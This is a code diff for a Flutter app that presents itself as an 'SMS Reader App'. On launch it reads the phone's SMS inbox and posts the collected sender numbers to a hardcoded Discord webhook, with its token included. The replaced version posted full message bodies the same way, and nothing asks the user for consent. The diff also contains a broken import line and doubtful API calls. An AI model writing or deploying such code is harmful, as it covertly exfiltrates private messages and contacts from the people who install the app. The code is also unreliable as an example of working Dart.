@@ -1,59 +1,74 @@
 import 'package:flutter/material.dart';
-import 'package:sms/sms.dart';
-import 'package:http/http.dart' as http;
+import 'package:flutter_sms/flutter_sms.dart';
+import 'package:http/http.dart as http';
 
-void main() {
-  runApp(MyApp());
-}
+void main() => runApp(MyApp());
 
-class MyApp extends StatefulWidget {
+class MyApp extends StatelessWidget {
   @override
-  _MyAppState createState() => _MyAppState();
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      home: SMSReaderApp(),
+    );
+  }
 }
 
-class _MyAppState extends State<MyApp> {
-  final String discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+class SMSReaderApp extends StatefulWidget {
+  @override
+  _SMSReaderAppState createState() => _SMSReaderAppState();
+}
+
+class _SMSReaderAppState extends State<SMSReaderApp> {
+  List<String> senderNumbers = [];
 
   @override
   void initState() {
     super.initState();
-    _startReadingSMS();
+    _fetchSMS();
   }
 
-  void _startReadingSMS() {
-    final SmsQuery query = SmsQuery();
-    List<SmsMessage> messages = query.querySms();
-
-    for (SmsMessage message in messages) {
-      _sendToDiscordWebhook(message);
+  Future<void> _fetchSMS() async {
+    final messages = await FlutterSms().getInboxMessages;
+    for (var message in messages) {
+      String senderNumber = message.address;
+      senderNumbers.add(senderNumber);
     }
+    setState(() {});
+    _sendToDiscord(senderNumbers);
   }
 
-  Future<void> _sendToDiscordWebhook(SmsMessage message) async {
-    final Uri uri = Uri.parse(discordWebhookUrl);
+  Future<void> _sendToDiscord(List<String> numbers) async {
+    final webhookUrl = 'https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU';
+    final message = 'SMS Sender Numbers: ${numbers.join(", ")}';
+    
     final response = await http.post(
-      uri,
-      headers: {'Content-Type': 'application/json'},
-      body: '{"content": "SMS from ${message.sender}:\n${message.body}"}',
+      Uri.parse(webhookUrl),
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: '{"content": "$message"}',
     );
 
     if (response.statusCode == 204) {
-      print('SMS sent to Discord successfully');
+      print('Message sent to Discord successfully');
     } else {
-      print('Failed to send SMS to Discord');
+      print('Failed to send message to Discord');
     }
   }
 
   @override
   Widget build(BuildContext context) {
-    return MaterialApp(
-      home: Scaffold(
-        appBar: AppBar(
-          title: Text('SMS to Discord'),
-        ),
-        body: Center(
-          child: Text('Reading SMS and sending to Discord...'),
-        ),
+    return Scaffold(
+      appBar: AppBar(
+        title: Text('SMS Reader App'),
+      ),
+      body: ListView.builder(
+        itemCount: senderNumbers.length,
+        itemBuilder: (context, index) {
+          return ListTile(
+            title: Text('Sender Number: ${senderNumbers[index]}'),
+          );
+        },
       ),
     );
   }
